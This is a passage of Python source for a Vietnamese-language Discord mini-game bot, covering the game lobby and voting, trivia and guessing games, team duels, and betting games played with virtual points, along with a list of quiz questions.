        await game_team_duel(channel)
    reset_players()
    
    embed_continue = discord.Embed(
        title="🎉 GAME ĐÃ KẾT THÚC! 🎉",
        description=f"**{MINI_GAMES[game_id]['name']}** đã hoàn thành!\n\n👑 Người chiến thắng đã được vinh danh!\n\nBạn có muốn chơi tiếp không?",
        color=discord.Color.gold()
    )
    view = ContinueView()
    await channel.send(embed=embed_continue, view=view)
    await view.wait()
    
    if view.value is None:
        view.value = False
    
    if view.value:
        await channel.send("🔄 **Tiếp tục chơi!** Bắt đầu vote sau 3 giây...")
        await asyncio.sleep(3)
        
        embed_vote = discord.Embed(
            title="🎮 **CHỌN MINI GAME** 🎮",
            description=f"Bấm nút bên dưới để bỏ phiếu chọn game.\n⏳ Thời gian còn lại: **{VOTE_DURATION}s**\n🏆 Game có số phiếu cao nhất sẽ được chọn!",
            color=discord.Color.blue()
        )
        for gid, g in MINI_GAMES.items():
            embed_vote.add_field(name=f"{g['emoji']} {g['name']}", value=g['desc'], inline=False)

        view_vote = VoteView(MINI_GAMES)
        vote_msg = await channel.send(embed=embed_vote, view=view_vote)
        
        for remaining in range(VOTE_DURATION, 0, -1):
            embed_vote.description = (
                f"Bấm nút bên dưới để bỏ phiếu chọn game.\n"
                f"⏳ Thời gian còn lại: **{remaining}s**\n"
                "🏆 Game có số phiếu cao nhất sẽ được chọn!"
            )
            await vote_msg.edit(embed=embed_vote)
            await asyncio.sleep(1)

        embed_vote.description = (
            f"Bấm nút bên dưới để bỏ phiếu chọn game.\n"
            f"⏳ Thời gian còn lại: **0s**\n"
            "🏆 Game có số phiếu cao nhất sẽ được chọn!"
        )
        await vote_msg.edit(embed=embed_vote)
        await asyncio.sleep(0.5)

        if not view_vote.votes:
            await channel.send("❌ Không có ai bỏ phiếu! Kết thúc phiên chơi.")
            keep_playing = False
            return

        vote_counts = {}
        for gid in view_vote.votes.values():
            vote_counts[gid] = vote_counts.get(gid, 0) + 1

        max_votes = max(vote_counts.values())
        top_games = [gid for gid, count in vote_counts.items() if count == max_votes]
        chosen_id = random.choice(top_games)
        chosen_game = MINI_GAMES[chosen_id]

        embed_result = discord.Embed(
            title="🎉 **GAME ĐƯỢC CHỌN** 🎉",
            description=f"**{chosen_game['emoji']} {chosen_game['name']}**\n"
                        f"📖 {chosen_game['desc']}\n"
                        f"🗳️ Số phiếu: **{max_votes}**",
            color=discord.Color.gold()
        )
        await channel.send(embed=embed_result)

        if chosen_id in GAME_INSTRUCTIONS:
            await channel.send(GAME_INSTRUCTIONS[chosen_id])

        if chosen_game['mode'] == "team":
            await run_team_game(channel, chosen_id)
        else:
            await run_mini_game(channel, chosen_id)
    else:
        await channel.send("⏹️ **Đã dừng chơi!** Cảm ơn các bạn đã tham gia! 🎮")
        keep_playing = False

# ===== MINI GAME 1: ĐOÁN SỐ =====
async def game_guess_number(channel):
    guild_id = str(channel.guild.id)
    number = random.randint(1, 100)
    embed = discord.Embed(title="🎯 ĐOÁN SỐ", description="Đoán số từ 1 đến 100 trong 5 lần!", color=discord.Color.blue())
    await channel.send(embed=embed)
    for attempt in range(5):
        def check(msg):
            return msg.author != client.user and msg.channel == channel and msg.content.isdigit()
        try:
            msg = await client.wait_for('message', timeout=30.0, check=check)
            guess = int(msg.content)
            if guess == number:
                await channel.send(f"✅ **{msg.author.mention}** đoán đúng! Số là {number}. +10 điểm")
                add_points(guild_id, msg.author.id, 10)
                return
            elif guess < number:
                await channel.send(f"⬆️ Số lớn hơn!")
            else:
                await channel.send(f"⬇️ Số nhỏ hơn!")
        except asyncio.TimeoutError:
            await channel.send(f"⏰ Hết giờ! Số đúng là {number}.")
            return
    await channel.send(f"❌ Hết lượt! Số đúng là {number}.")

# ===== MINI GAME 2: ĐỐ VUI =====
async def game_quiz(channel):
    guild_id = str(channel.guild.id)
    q = random.choice(QUESTIONS)
    embed = discord.Embed(title="🧠 ĐỐ VUI", description=f"**{q['question']}**\n\nChọn đáp án: {', '.join(q['options'])}", color=discord.Color.green())
    await channel.send(embed=embed)
    def check(msg):
        return msg.author != client.user and msg.channel == channel and msg.content.lower() in [opt.lower() for opt in q['options']]
    try:
        msg = await client.wait_for('message', timeout=30.0, check=check)
        answer = msg.content.lower()
        correct = q['options'][q['answer']].lower()
        if answer == correct:
            await channel.send(f"✅ **{msg.author.mention}** trả lời đúng! +10 điểm")
            add_points(guild_id, msg.author.id, 10)
        else:
            await channel.send(f"❌ Sai! Đáp án đúng là: **{correct}**")
    except asyncio.TimeoutError:
        correct = q['options'][q['answer']]
        await channel.send(f"⏰ Hết giờ! Đáp án đúng là: **{correct}**")

# ===== MINI GAME 3: TÍNH NHANH =====
async def game_math_fast(channel):
    guild_id = str(channel.guild.id)
    a, b = random.randint(1, 20), random.randint(1, 20)
    op = random.choice(['+', '-', '*'])
    if op == '+': result = a + b
    elif op == '-': result = a - b
    else: result = a * b
    embed = discord.Embed(title="⚡ TÍNH NHANH", description=f"**{a} {op} {b} = ?**\n\nTrả lời trong 5 giây!", color=discord.Color.orange())
    await channel.send(embed=embed)
    def check(msg):
        return msg.author != client.user and msg.channel == channel and msg.content.isdigit()
    try:
        msg = await client.wait_for('message', timeout=5.0, check=check)
        if int(msg.content) == result:
            await channel.send(f"✅ **{msg.author.mention}** trả lời đúng! +10 điểm")
            add_points(guild_id, msg.author.id, 10)
        else:
            await channel.send(f"❌ Sai! Đáp án đúng là: **{result}**")
    except asyncio.TimeoutError:
        await channel.send(f"⏰ Hết giờ! Đáp án đúng là: **{result}**")

# ===== MINI GAME 4: ĐỎ ĐEN =====
async def game_red_black(channel):
    guild_id = str(channel.guild.id)
    colors = ["Đỏ", "Đen"]
    result = random.choice(colors)
    embed = discord.Embed(title="🎲 ĐỎ ĐEN", description="Chọn **Đỏ** hoặc **Đen**. Cược 10 điểm!\nNếu đúng bạn nhận +20 điểm, sai mất 10 điểm.", color=discord.Color.red())
    await channel.send(embed=embed)
    def check(msg):
        return msg.author != client.user and msg.channel == channel and msg.content.lower() in ['đỏ', 'đen']
    try:
        msg = await client.wait_for('message', timeout=30.0, check=check)
        bet = msg.content.lower()
        user_id = str(msg.author.id)
        if bet == result.lower():
            add_points(guild_id, msg.author.id, 20)
            await channel.send(f"🎉 **{msg.author.mention}** thắng! Kết quả: {result}. +20 điểm")
        else:
            add_points(guild_id, msg.author.id, -10)
            await channel.send(f"💀 **{msg.author.mention}** thua! Kết quả: {result}. -10 điểm")
    except asyncio.TimeoutError:
        await channel.send(f"⏰ Hết giờ!")

# ===== MINI GAME 5: TÀI XỈU =====
ready_users = set()

async def game_tai_xiu(channel):
    global ready_users
    guild_id = str(channel.guild.id)
    ready_users = set()
    player_ids = list(players.keys())
    if len(player_ids) < 2:
        await channel.send("❌ Cần ít nhất 2 người để chơi!")
        return

    embed = discord.Embed(
        title="🎲 TÀI XỈU - ĐOÁN ĐIỂM XÚC XẮC",
        description="📖 **HƯỚNG DẪN**\n"
                    "1️⃣ Mỗi người chọn **SẴN SÀNG** để tham gia.\n"
                    "2️⃣ Bot sẽ tung xúc xắc (1-6).\n"
                    "3️⃣ Bạn có **10 giây** để dự đoán số điểm.\n"
                    "4️⃣ Nhập: `số_dự_đoán số_điểm_cược` (ví dụ: `5 50`).\n"
                    "5️⃣ Cược tối thiểu **10 điểm**.\n"
                    "6️⃣ Nếu đúng → nhận điểm, sai → mất điểm.",
        color=discord.Color.blue()
    )
    await channel.send(embed=embed)

    class ReadyView(discord.ui.View):
        def __init__(self):
            super().__init__(timeout=30)
            self.add_item(discord.ui.Button(label="✅ SẴN SÀNG", style=discord.ButtonStyle.success, custom_id="ready_tai_xiu"))

    view = ReadyView()
    await channel.send("⏳ Bấm **SẴN SÀNG** để tham gia!", view=view)
    await asyncio.sleep(30)

    if len(ready_users) < 2:
        await channel.send("❌ Không đủ người sẵn sàng! Hủy game.")
        return

    dice_result = random.randint(1, 6)
    await channel.send(f"🎲 **Xúc xắc đã được tung!** Bạn có 10 giây để dự đoán số điểm.")

    predictions = {}
    def check(msg):
        return msg.author.id in [int(uid) for uid in ready_users] and msg.channel == channel

    start_time = time.time()
    timeout = 10
    while time.time() - start_time < timeout:
        try:
            msg = await client.wait_for('message', timeout=1.0, check=check)
            parts = msg.content.split()
            if len(parts) != 2:
                await msg.author.send("❌ Sai cú pháp! Hãy nhập: `5 50`")
                continue

            try:
                guess = int(parts[0])
                bet_amount = int(parts[1])
            except:
                await msg.author.send("❌ Vui lòng nhập số!")
                continue

            if guess < 1 or guess > 6:
                await msg.author.send("❌ Số điểm dự đoán phải từ 1 đến 6!")
                continue

            if bet_amount < 10:
                await msg.author.send("❌ Số điểm cược tối thiểu là 10!")
                continue

            user_id = str(msg.author.id)
            current_score = get_points(guild_id, user_id)
            if bet_amount > current_score:
                await msg.author.send(f"❌ Bạn chỉ có **{current_score}** điểm!")
                continue

            predictions[user_id] = {"guess": guess, "amount": bet_amount}
            await msg.author.send(f"✅ Bạn đã cược **{bet_amount}** điểm vào số **{guess}**!")

        except asyncio.TimeoutError:
            continue

    if not predictions:
        await channel.send("❌ Không có ai đặt cược! Hủy game.")
        return

    await channel.send(f"🎲 **Kết quả xúc xắc: {dice_result}**")

    winners = [uid for uid, pred in predictions.items() if pred["guess"] == dice_result]
    losers = [uid for uid, pred in predictions.items() if pred["guess"] != dice_result]

    if not winners:
        await channel.send("❌ Không ai đoán đúng! Tất cả mất điểm.")
        for uid, pred in predictions.items():
            add_points(guild_id, uid, -pred["amount"])
        return

    total_lost = sum(predictions[uid]["amount"] for uid in losers)
    win_amount = total_lost // len(winners)

    for uid in winners:
        add_points(guild_id, uid, win_amount)

    for uid in losers:
        add_points(guild_id, uid, -predictions[uid]["amount"])

    result_msg = "📊 **KẾT QUẢ CƯỢC**\n"
    for uid, pred in predictions.items():
        try:
            user = await client.fetch_user(int(uid))
            name = user.display_name
        except:
            name = uid
        status = "✅ THẮNG" if uid in winners else "❌ THUA"
        new_score = get_points(guild_id, uid)
        result_msg += f"{name}: {status} | Dự đoán: {pred['guess']} | Cược: {pred['amount']} | Điểm mới: {new_score}\n"

    await channel.send(result_msg)

# ===== MINI GAME 6: ĐIỀN TỪ =====
async def game_fill_word(channel):
    guild_id = str(channel.guild.id)
    words = ["Minecraft", "Discord", "Python", "Roblox", "Java"]
    word = random.choice(words)
    hidden = word[0] + "_" * (len(word)-2) + word[-1]
    embed = discord.Embed(title="📝 ĐIỀN TỪ", description=f"Từ: **{hidden}**\nNhập từ đúng!", color=discord.Color.purple())
    await channel.send(embed=embed)
    def check(msg):
        return msg.author != client.user and msg.channel == channel
    try:
        msg = await client.wait_for('message', timeout=30.0, check=check)
        if msg.content.lower() == word.lower():
            await channel.send(f"✅ **{msg.author.mention}** điền đúng! +10 điểm")
            add_points(guild_id, msg.author.id, 10)
        else:
            await channel.send(f"❌ Sai! Từ đúng là: **{word}**")
    except asyncio.TimeoutError:
        await channel.send(f"⏰ Hết giờ! Từ đúng là: **{word}**")

# ===== MINI GAME 7: ĐOÁN BÀI HÁT =====
async def game_guess_song(channel):
    guild_id = str(channel.guild.id)
    songs = {"Shape of You": "Một ca khúc của Ed Sheeran",
             "Bohemian Rhapsody": "Ca khúc của Queen",
             "Baby": "Ca khúc của Justin Bieber"}
    song, hint = random.choice(list(songs.items()))
    embed = discord.Embed(title="🎵 ĐOÁN BÀI HÁT", description=f"Gợi ý: {hint}\nĐoán tên bài hát!", color=discord.Color.magenta())
    await channel.send(embed=embed)
    def check(msg):
        return msg.author != client.user and msg.channel == channel
    try:
        msg = await client.wait_for('message', timeout=30.0, check=check)
        if msg.content.lower() == song.lower():
            await channel.send(f"✅ **{msg.author.mention}** đoán đúng! +10 điểm")
            add_points(guild_id, msg.author.id, 10)
        else:
            await channel.send(f"❌ Sai! Bài hát là: **{song}**")
    except asyncio.TimeoutError:
        await channel.send(f"⏰ Hết giờ! Bài hát là: **{song}**")

# ===== MINI GAME 8: AI NHANH HƠN =====
async def game_quick_respond(channel):
    guild_id = str(channel.guild.id)
    embed = discord.Embed(title="🏆 AI NHANH HƠN", description="Ai trả lời **'tôi'** nhanh nhất sẽ thắng!", color=discord.Color.gold())
    await channel.send(embed=embed)
    def check(msg):
        return msg.author != client.user and msg.channel == channel and msg.content.lower() == "tôi"
    try:
        msg = await client.wait_for('message', timeout=5.0, check=check)
        await channel.send(f"🏆 **{msg.author.mention}** thắng! +10 điểm")
        add_points(guild_id, msg.author.id, 10)
    except asyncio.TimeoutError:
        await channel.send("⏰ Không ai trả lời!")

# ===== MINI GAME 9: GIẢI ĐỐ =====
async def game_puzzle(channel):
    guild_id = str(channel.guild.id)
    puzzles = ["Cái gì càng lau càng bẩn?", "Quả gì không ăn được?"]
    answer = ["bảng đen", "quả đấm"]
    idx = random.randint(0, len(puzzles)-1)
    embed = discord.Embed(title="🧩 GIẢI ĐỐ", description=puzzles[idx], color=discord.Color.teal())
    await channel.send(embed=embed)
    def check(msg):
        return msg.author != client.user and msg.channel == channel
    try:
        msg = await client.wait_for('message', timeout=30.0, check=check)
        if msg.content.lower() == answer[idx]:
            await channel.send(f"✅ **{msg.author.mention}** giải đố đúng! +10 điểm")
            add_points(guild_id, msg.author.id, 10)
        else:
            await channel.send(f"❌ Sai! Đáp án là: **{answer[idx]}**")
    except asyncio.TimeoutError:
        await channel.send(f"⏰ Hết giờ! Đáp án là: **{answer[idx]}**")

# ===== MINI GAME 10: THỬ THÁCH =====
async def game_challenge(channel):
    guild_id = str(channel.guild.id)
    challenges = ["Hát một bài hát", "Kể một câu chuyện cười", "Nói một câu tiếng Anh"]
    challenge = random.choice(challenges)
    embed = discord.Embed(title="💪 THỬ THÁCH", description=f"Thử thách: **{challenge}**\nHoàn thành để nhận +10 điểm!", color=discord.Color.red())
    await channel.send(embed=embed)
    def check(msg):
        return msg.author != client.user and msg.channel == channel
    try:
        msg = await client.wait_for('message', timeout=60.0, check=check)
        await channel.send(f"🎉 **{msg.author.mention}** hoàn thành thử thách! +10 điểm")
        add_points(guild_id, msg.author.id, 10)
    except asyncio.TimeoutError:
        await channel.send("⏰ Không ai hoàn thành thử thách!")

# ===== MINI GAME 11: ĐẤU TEAM =====
async def game_team_duel(channel):
    guild_id = str(channel.guild.id)
    player_ids = list(players.keys())
    if len(player_ids) < 2:
        await channel.send("❌ Cần ít nhất 2 người để chơi team!")
        return

    random.shuffle(player_ids)
    team1 = player_ids[:len(player_ids)//2]
    team2 = player_ids[len(player_ids)//2:]

    team1_mentions = ", ".join([f"<@{uid}>" for uid in team1])
    team2_mentions = ", ".join([f"<@{uid}>" for uid in team2])

    embed = discord.Embed(
        title="⚔️ **ĐẤU TEAM** ⚔️",
        description=f"**Đội 1:** {team1_mentions}\n**Đội 2:** {team2_mentions}\n\nHãy thi đấu để giành chiến thắng!",
        color=discord.Color.red()
    )
    await channel.send(embed=embed)

    q = random.choice(QUESTIONS)
    embed_q = discord.Embed(
        title="❓ **Câu hỏi dành cho cả 2 đội**",
        description=f"**{q['question']}**\n\nĐội nào trả lời đúng trước sẽ thắng!",
        color=discord.Color.blue()
    )
    await channel.send(embed=embed_q)

    def check(msg):
        return msg.author.id in [int(uid) for uid in player_ids] and msg.channel == channel

    try:
        msg = await client.wait_for('message', timeout=30.0, check=check)
        answer = msg.content.lower()
        correct = q['options'][q['answer']].lower()
        if answer == correct:
            if str(msg.author.id) in team1:
                await channel.send(f"🎉 **Đội 1** trả lời đúng! +10 điểm cho toàn đội!")
                for uid in team1:
                    add_points(guild_id, uid, 10)
            else:
                await channel.send(f"🎉 **Đội 2** trả lời đúng! +10 điểm cho toàn đội!")
                for uid in team2:
                    add_points(guild_id, uid, 10)
        else:
            await channel.send(f"❌ Sai! Đáp án đúng là: **{correct}**")
    except asyncio.TimeoutError:
        correct = q['options'][q['answer']]
        await channel.send(f"⏰ Hết giờ! Đáp án đúng là: **{correct}**")

# ===== MINI GAME 12: SOLO ĐẤU =====
async def game_solo_duel(channel):
    guild_id = str(channel.guild.id)
    player_ids = list(players.keys())
    if len(player_ids) < 2:
        await channel.send("❌ Cần ít nhất 2 người để solo đấu!")
        return

    p1, p2 = random.sample(player_ids, 2)
    embed = discord.Embed(
        title="🎖️ **SOLO ĐẤU** 🎖️",
        description=f"<@{p1}> vs <@{p2}>\nAi trả lời đúng trước sẽ thắng!",
        color=discord.Color.gold()
    )
    await channel.send(embed=embed)

    q = random.choice(QUESTIONS)
    embed_q = discord.Embed(
        title="❓ **Câu hỏi**",
        description=f"**{q['question']}**",
        color=discord.Color.blue()
    )
    await channel.send(embed=embed_q)

    def check(msg):
        return msg.author.id in [int(p1), int(p2)] and msg.channel == channel

    try:
        msg = await client.wait_for('message', timeout=30.0, check=check)
        answer = msg.content.lower()
        correct = q['options'][q['answer']].lower()
        if answer == correct:
            await channel.send(f"🎉 **{msg.author.mention}** thắng! +15 điểm")
            add_points(guild_id, msg.author.id, 15)
        else:
            await channel.send(f"❌ Sai! Đáp án đúng là: **{correct}**")
    except asyncio.TimeoutError:
        correct = q['options'][q['answer']]
        await channel.send(f"⏰ Hết giờ! Đáp án đúng là: **{correct}**")

# ===== MINI GAME 13: ĐUA XE =====
async def game_race(channel):
    guild_id = str(channel.guild.id)
    player_ids = list(players.keys())
    if len(player_ids) < 2:
        await channel.send("❌ Cần ít nhất 2 người để đua xe!")
        return

    colors = ["🔴 Đỏ", "🔵 Xanh", "🟢 Xanh lá", "🟡 Vàng", "🟣 Tím", "⚫ Đen"]
    embed = discord.Embed(
        title="🏎️ ĐUA XE - CƯỢC ĐIỂM",
        description="📖 **HƯỚNG DẪN**\n"
                    "1️⃣ Chọn màu xe và nhập số điểm cược.\n"
                    "2️⃣ Ví dụ: `Đỏ 50` hoặc `Xanh 20`.\n"
                    "3️⃣ Cược tối thiểu **10 điểm**.\n"
                    "4️⃣ Xe sẽ chạy và về đích – ai chọn đúng màu sẽ thắng!\n"
                    f"🎨 Các màu: {', '.join(colors)}",
        color=discord.Color.blue()
    )
    await channel.send(embed=embed)

    bets = {}
    def check(msg):
        return msg.author.id in [int(uid) for uid in player_ids] and msg.channel == channel

    start_time = time.time()
    timeout = 30
    while time.time() - start_time < timeout:
        try:
            msg = await client.wait_for('message', timeout=1.0, check=check)
            parts = msg.content.split()
            if len(parts) != 2:
                await msg.author.send("❌ Sai cú pháp! Hãy nhập: `Đỏ 50` hoặc `Xanh 20`")
                continue

            color = parts[0].lower()
            try:
                bet_amount = int(parts[1])
            except:
                await msg.author.send("❌ Số điểm cược không hợp lệ!")
                continue

            if bet_amount < 10:
                await msg.author.send("❌ Số điểm cược tối thiểu là 10!")
                continue

            user_id = str(msg.author.id)
            current_score = get_points(guild_id, user_id)
            if bet_amount > current_score:
                await msg.author.send(f"❌ Bạn chỉ có **{current_score}** điểm!")
                continue

            color_map = {"đỏ": "🔴 Đỏ", "xanh": "🔵 Xanh", "xanh lá": "🟢 Xanh lá", "vàng": "🟡 Vàng", "tím": "🟣 Tím", "đen": "⚫ Đen"}
            if color not in color_map:
                await msg.author.send("❌ Màu không hợp lệ! Chọn: Đỏ, Xanh, Xanh lá, Vàng, Tím, Đen")
                continue

            bets[user_id] = {"color": color_map[color], "amount": bet_amount}
            await msg.author.send(f"✅ Bạn đã cược **{bet_amount}** điểm vào xe màu **{color_map[color]}**!")

        except asyncio.TimeoutError:
            continue

    if not bets:
        await channel.send("❌ Không có ai đặt cược! Hủy game.")
        return

    race_msg = await channel.send("🏎️ **ĐUA XE BẮT ĐẦU!**")
    winner_color = random.choice(colors)
    
    for i in range(5, 0, -1):
        animation = ""
        for color in colors:
            if color == winner_color:
                animation += f"{color} 🚀\n"
            else:
                animation += f"{color} 🏁\n"
        await race_msg.edit(content=f"🏎️ **ĐUA XE**\n{animation}\n⏳ Còn **{i}** giây...")
        await asyncio.sleep(1)

    await channel.send(f"🏆 **Xe màu {winner_color} về đích!**")

    winners = [uid for uid, bet in bets.items() if bet["color"] == winner_color]
    losers = [uid for uid, bet in bets.items() if bet["color"] != winner_color]

    if not winners:
        await channel.send("❌ Không ai thắng! Tất cả mất điểm.")
        for uid, bet in bets.items():
            add_points(guild_id, uid, -bet["amount"])
        return

    total_lost = sum(bets[uid]["amount"] for uid in losers)
    win_amount = total_lost // len(winners)

    for uid in winners:
        add_points(guild_id, uid, win_amount)

    for uid in losers:
        add_points(guild_id, uid, -bets[uid]["amount"])

    result_msg = "📊 **KẾT QUẢ CƯỢC**\n"
    for uid, bet in bets.items():
        try:
            user = await client.fetch_user(int(uid))
            name = user.display_name
        except:
            name = uid
        status = "✅ THẮNG" if uid in winners else "❌ THUA"
        new_score = get_points(guild_id, uid)
        result_msg += f"{name}: {status} | Màu: {bet['color']} | Cược: {bet['amount']} | Điểm mới: {new_score}\n"

    await channel.send(result_msg)

# ===== CÂU HỎI MỞ RỘNG =====
QUESTIONS = [
    {"question": "Thủ đô của Việt Nam là?", "options": ["Hà Nội", "TP.HCM", "Đà Nẵng", "Hải Phòng"], "answer": 0},
    {"question": "2 + 2 = ?", "options": ["3", "4", "5", "6"], "answer": 1},
    {"question": "Màu sắc nào là màu của lá cây?", "options": ["Đỏ", "Xanh lá", "Vàng", "Tím"], "answer": 1},
    {"question": "Con vật nào được gọi là vua của rừng xanh?", "options": ["Hổ", "Sư tử", "Voi", "Báo"], "answer": 1},
    {"question": "Hành tinh nào gần mặt trời nhất?", "options": ["Sao Kim", "Sao Thủy", "Trái Đất", "Sao Hỏa"], "answer": 1},
    {"question": "Nước nào có diện tích lớn nhất thế giới?", "options": ["Trung Quốc", "Hoa Kỳ", "Nga", "Canada"], "answer": 2},
    {"question": "Nguyên tố hóa học nào có ký hiệu O?", "options": ["Oxy", "Oganesson", "Osmium", "Oxygenium"], "answer": 0},
    {"question": "Ai là tác giả của 'Truyện Kiều'?", "options": ["Nguyễn Du", "Hồ Xuân Hương", "Nguyễn Đình Chiểu", "Tản Đà"], "answer": 0},
    {"question": "Động vật nào có cổ dài nhất?", "options": ["Hươu cao cổ", "Lạc đà", "Ngựa", "Voi"], "answer": 0},
    {"question": "Máy tính sử dụng hệ đếm nào?", "options": ["Thập phân", "Nhị phân", "Thập lục phân", "Bát phân"], "answer": 1},
    {"question": "Năm 1945, Việt Nam giành độc lập từ tay nước nào?", "options": ["Pháp", "Nhật", "Mỹ", "Anh"], "answer": 0},
    {"question": "Phương trình hóa học của nước là gì?", "options": ["H2O", "CO2", "NaCl", "HCl"], "answer": 0},
    {"question": "Loài chim nào biết nói?", "options": ["Vẹt", "Đại bàng", "Cú mèo", "Chim sẻ"], "answer": 0},
    {"question": "Số nguyên tố nào sau đây là nhỏ nhất?", "options": ["1", "2", "3", "5"], "answer": 1},
    {"question": "Ai là người sáng lập ra Microsoft?", "options": ["Bill Gates", "Steve Jobs", "Elon Musk", "Mark Zuckerberg"], "answer": 0},
    {"question": "Quốc kỳ của Việt Nam có màu gì?", "options": ["Đỏ và vàng", "Xanh và trắng", "Đỏ và trắng", "Vàng và đen"], "answer": 0},
    {"question": "Đơn vị đo lường của cường độ dòng điện là gì?", "options": ["Ampe", "Vôn", "Ôm", "Watt"], "answer": 0},
    {"question": "Bộ phận nào của cây thực hiện quang hợp?", "options": ["Lá", "Rễ", "Thân", "Hoa"], "answer": 0},
    {"question": "Trái Đất tự quay quanh trục mất bao lâu?", "options": ["24 giờ", "12 giờ", "48 giờ", "365 ngày"], "answer": 0},
    {"question": "Hợp chất NaCl còn gọi là gì?", "options": ["Muối ăn", "Đường", "Baking soda", "Giấm"], "answer": 0},
    {"question": "Động vật nào có thể sống trên cạn và dưới nước?", "options": ["Cá sấu", "Cá heo", "Cá mập", "Cá voi"], "answer": 0},
    {"question": "Số π (pi) xấp xỉ bằng bao nhiêu?", "options": ["3.14", "2.71", "1.61", "0.58"], "answer": 0},
    {"question": "Ai là vị tướng nổi tiếng của Việt Nam trong kháng chiến chống Mỹ?", "options": ["Võ Nguyên Giáp", "Nguyễn Huệ", "Trần Hưng Đạo", "Lê Lợi"], "answer": 0},
    {"question": "Màu sắc nào tượng trưng cho hòa bình?", "options": ["Trắng", "Đỏ", "Đen", "Xanh"], "answer": 0},
    {"question": "Loại quả nào có nhiều vitamin C nhất?", "options": ["Cam", "Táo", "Chuối", "Nho"], "answer": 0},
    {"question": "Năm nhuận có bao nhiêu ngày?", "options": ["366", "365", "364", "360"], "answer": 0},
    {"question": "Sông nào dài nhất thế giới?", "options": ["Amazon", "Nile", "Mississippi", "Dương Tử"], "answer": 1},
    {"question": "Người đầu tiên đặt chân lên mặt trăng là ai?", "options": ["Neil Armstrong", "Buzz Aldrin", "Yuri Gagarin", "John Glenn"], "answer": 0},
    {"question": "Phần mềm nào dùng để duyệt web?", "options": ["Chrome", "Word", "Excel", "PowerPoint"], "answer": 0},
    {"question": "Loài hoa nào là biểu tượng của tình yêu?", "options": ["Hoa hồng", "Hoa cúc", "Hoa lan", "Hoa sen"], "answer": 0}
]

# ===== KHỞI TẠO CLIENT VÀ TREE =====
intents = discord.Intents.all()
client = discord.Client(intents=intents)
tree = app_commands.CommandTree(client)

# ===== LỆNH START =====
@tree.command(name="start", description="🎮 Mở sảnh game – tham gia và bắt đầu")
async def slash_start(interaction: discord.Interaction):
    global keep_playing
    if not interaction.guild:
        await interaction.response.send_message("❌ Lệnh này chỉ dùng trong server!", ephemeral=True)
        return
    
    permissions = interaction.channel.permissions_for(interaction.guild.me)
    if not permissions.send_messages:
        await interaction.response.send_message("❌ Bot thiếu quyền gửi tin nhắn trong kênh này!", ephemeral=True)
        return

    keep_playing = True
    
    reset_players()
    player_list = "\n".join([f"👤 {name}" for name in players.values()]) if players else "Chưa có ai tham gia"
    embed = discord.Embed(
        title="🎮 **SẢNH GAME - BANANAVUIVE** 🎮",
        description=f"⏳ Nhấn **Tham gia ngay!** để vào game.\n"
                    f"👥 Số người đã tham gia: **{len(players)}**\n"
                    f"📋 **Danh sách:**\n{player_list}\n"
                    "▶️ Nhấn **Bắt đầu game!** để bắt đầu vote.",
        color=discord.Color.blue()
    )
    view = StartView()
    await interaction.response.send_message(embed=embed, view=view)
    
    while keep_playing:
        await asyncio.sleep(1)
    
    await interaction.followup.send("👋 **Cảm ơn bạn đã chơi!** Hẹn gặp lại!")

# ===== XỬ LÝ BUTTON =====
@client.event
async def on_interaction(interaction: discord.Interaction):
    if interaction.type != discord.InteractionType.component:
        return

    custom_id = interaction.data.get("custom_id")
    
    if custom_id == "join_start":
        try:
            await interaction.response.defer()
            global players
            players = load_players()
            user_id = str(interaction.user.id)
            if user_id not in players:
                players[user_id] = interaction.user.name
                save_players(players)
                embed = interaction.message.embeds[0]
                player_list = "\n".join([f"👤 {name}" for name in players.values()]) if players else "Chưa có ai tham gia"
                embed.description = f"⏳ Nhấn **Tham gia ngay!** để vào game.\n👥 Số người đã tham gia: **{len(players)}**\n📋 **Danh sách:**\n{player_list}\n▶️ Nhấn **Bắt đầu game!** để bắt đầu vote."
                view = StartView()
                await interaction.edit_original_response(embed=embed, view=view)
                await interaction.followup.send(f"✅ **{interaction.user.mention}** đã tham gia!", ephemeral=False)
            else:
                await interaction.followup.send("❌ Bạn đã tham gia rồi!", ephemeral=True)
        except Exception as e:
            print(f"[!] Lỗi join_start: {e}")

    elif custom_id == "start_game":
        await interaction.response.defer()
        if len(players) < 1:
            await interaction.followup.send("❌ Cần ít nhất 1 người tham gia để bắt đầu!", ephemeral=True)
            return

        await interaction.followup.send("⏳ Bắt đầu sau 3 giây...", ephemeral=False)
        for i in range(3, 0, -1):
            await interaction.edit_original_response(content=f"⏳ Bắt đầu sau {i} giây...")
            await asyncio.sleep(1)
        await interaction.edit_original_response(content="✅ Bắt đầu vote!")

        embed_vote = discord.Embed(
            title="🎮 **CHỌN MINI GAME** 🎮",
            description=f"Bấm nút bên dưới để bỏ phiếu chọn game.\n⏳ Thời gian còn lại: **{VOTE_DURATION}s**\n🏆 Game có số phiếu cao nhất sẽ được chọn!",
            color=discord.Color.blue()
        )
        for game_id, game in MINI_GAMES.items():
            embed_vote.add_field(name=f"{game['emoji']} {game['name']}", value=game['desc'], inline=False)

        view = VoteView(MINI_GAMES)
        vote_msg = await interaction.followup.send(embed=embed_vote, view=view)
        
        for remaining in range(VOTE_DURATION, 0, -1):
            embed_vote.description = (
                f"Bấm nút bên dưới để bỏ phiếu chọn game.\n"
                f"⏳ Thời gian còn lại: **{remaining}s**\n"
                "🏆 Game có số phiếu cao nhất sẽ được chọn!"
            )
            await vote_msg.edit(embed=embed_vote)
            await asyncio.sleep(1)

        embed_vote.description = (
            f"Bấm nút bên dưới để bỏ phiếu chọn game.\n"
            f"⏳ Thời gian còn lại: **0s**\n"
            "🏆 Game có số phiếu cao nhất sẽ được chọn!"
        )
        await vote_msg.edit(embed=embed_vote)
        await asyncio.sleep(0.5)

        if not view.votes:
            await interaction.followup.send("❌ Không có ai bỏ phiếu! Hãy dùng `/start` lại.", ephemeral=True)
            return

        vote_counts = {}
        for game_id in view.votes.values():
            vote_counts[game_id] = vote_counts.get(game_id, 0) + 1

        max_votes = max(vote_counts.values())
        top_games = [gid for gid, count in vote_counts.items() if count == max_votes]
        chosen_id = random.choice(top_games)
        chosen_game = MINI_GAMES[chosen_id]

        embed_result = discord.Embed(
            title="🎉 **GAME ĐƯỢC CHỌN** 🎉",
            description=f"**{chosen_game['emoji']} {chosen_game['name']}**\n"
                        f"📖 {chosen_game['desc']}\n"
                        f"🗳️ Số phiếu: **{max_votes}**",
            color=discord.Color.gold()
        )
        await interaction.followup.send(embed=embed_result)

        if chosen_id in GAME_INSTRUCTIONS:
            await interaction.channel.send(GAME_INSTRUCTIONS[chosen_id])

        if chosen_game['mode'] == "team":
            await run_team_game(interaction.channel, chosen_id)
        else:
            await run_mini_game(interaction.channel, chosen_id)

